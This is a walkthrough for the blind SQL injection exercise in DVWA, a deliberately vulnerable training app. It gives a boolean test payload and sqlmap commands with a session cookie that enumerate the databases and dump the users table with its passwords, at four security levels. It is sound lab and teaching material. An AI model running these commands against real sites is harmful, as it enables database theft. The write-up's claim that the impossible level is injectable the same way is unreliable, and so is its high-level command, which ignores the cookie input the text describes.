# DVWA - SQL Injection (Blind) Solution

## Low level

Use `1' or '1' = '1' #` to test the SQL injection. The web response 'User ID exists in the database'. So, we can know there can be attack.

![](https://i.imgur.com/43sNhp1.png)

Then we use the tool named 'sqlmap' to get the database's name.
We need to get the cookie on the browser, tpye `document.cookie` on the consloe on browser.

Open the consoleuse "F12" and enter the `document.cookie` to get the cookie.

![](https://i.imgur.com/JuU9HSP.png)

And use the following command to get the name of database. 

```bash
sqlmap -u "http://192.168.1.66/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=v0df91sctmp8jm7mh17pc1rlnd;" --current-db 
```

![](https://i.imgur.com/drfAfxk.png)

Now we can change the environment variable to get the tables name using the following command.

```bash
sqlmap -u "http://192.168.1.66/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=v0df91sctmp8jm7mh17pc1rlnd;" -D dvwa --tables
```

Then we can get the table name in the "dvwa" database.

![](https://i.imgur.com/4EC9MU9.png)

Use the followig command to get the columns name.

```bash
sqlmap -u "http://192.168.1.66/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=v0df91sctmp8jm7mh17pc1rlnd;" -D dvwa -T users --columns
```

![](https://i.imgur.com/bJKOkXJ.png)

Use the followig command to get the data in database.

```bash
sqlmap -u "http://192.168.1.66/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=v0df91sctmp8jm7mh17pc1rlnd" -D dvwa -T users -C user,avatar,password --technique=B -v 3 --dump --batch
```

![](https://i.imgur.com/NEpQJXQ.png)

## Medium level

In this case, the web use the select bar to choose the idto search.
Then we use the proxy to check the request, as the figure can see, it use the post method to get the data.

![](https://i.imgur.com/8BUgk7L.png)

In this level we also use the sqlmap to inject to the sql.

Use the following command to attack the sql.

```bash
sqlmap -u "http://192.168.1.66/DVWA-master/vulnerabilities/sqli_blind/" --cookie "security=medium; PHPSESSID=v0df91sctmp8jm7mh17pc1rlnd;" --data="id=1&Submit=Submit" --dbs
```

![](https://i.imgur.com/KMGYhDt.png)

We can see all of database in this sql.

We can use the following command like the low level to get the tables.

```bash
sqlmap -u "http://192.168.1.66/DVWA-master/vulnerabilities/sqli_blind/" --cookie "security=medium; PHPSESSID=v0df91sctmp8jm7mh17pc1rlnd;" --data="id=1&Submit=Submit" -D dvwa --tables
```

![](https://i.imgur.com/jQA7FYO.png)

As the figure can see there is two tables named guestbook and users.

We also can use the same way to get other information in this sql.

## High level

In high level, it will set the input to the cookie. Then will read the cookie and get the newest id in cookie and sent it to the backend to search. As the figure can see the request header.

![](https://i.imgur.com/I8uGHmG.png)

So, we can also use the sqlmap to attack the sql using the following command like the previous level.

```bahs
sqlmap -u "http://192.168.1.66/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie "security=high; PHPSESSID=v0df91sctmp8jm7mh17pc1rlnd;" --dbs
```

![](https://i.imgur.com/LUj4gwH.png)

We can use the similar way like prevous level to get the information from the sql.

## Impossible level

In the impossible level the request need to include 'user_token'. We can use the proxy to know it like the following figure.

![](https://i.imgur.com/xzI9IDF.png)

Therefore we can use the sqlmap in the same way to get the information from the sql.

Using the following command we can see all of databases' name in the sql.

```bash
sqlmap -u "http://192.168.1.66/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit&user_token=f489d3c81e8579ead5f61d4947bf3d3e" --cookie "security=impossible; PHPSESSID=v0df91sctmp8jm7mh17pc1rlnd" --dbs
```

![](https://i.imgur.com/Qly6dTg.png)

Then you can use the similar way to get the other information.
